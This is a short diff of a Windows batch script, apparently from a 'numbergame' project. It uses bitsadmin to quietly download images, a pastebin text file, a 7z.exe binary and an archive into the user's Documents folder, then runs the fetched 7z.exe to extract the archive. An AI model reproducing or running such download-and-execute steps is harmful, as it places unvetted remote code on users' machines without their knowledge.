@@ -21,9 +21,8 @@ bitsadmin.exe /transfer "Seinfeld Three" https://i.imgur.com/tVJDKnF.jpg %UserPr
 IF EXIST %UserProfile%\Documents\trophy.txt GOTO zip
 bitsadmin.exe /transfer "Trophy" https://pastebin.com/raw/hbP6Wn2Z %UserProfile%\Documents\trophy.txt
 :zip
-IF EXIST %UserProfile%\Documents\documents.7z GOTO 7z
+IF EXIST %UserProfile%\Documents\Files.7z GOTO skip
 bitsadmin.exe /transfer "7z.exe" https://github.com/Leeaah/numbergame2/raw/master/Numbergame/7z.exe %UserProfile%\Documents\7z.exe
-:7z
 cd %UserProfile%\Documents
 bitsadmin.exe /transfer "documents" https://github.com/Leeaah/numbergame2/raw/master/Numbergame/files.7z %UserProfile%\Documents\files.7z
 "%UserProfile%\Documents\7z.exe" x files.7z
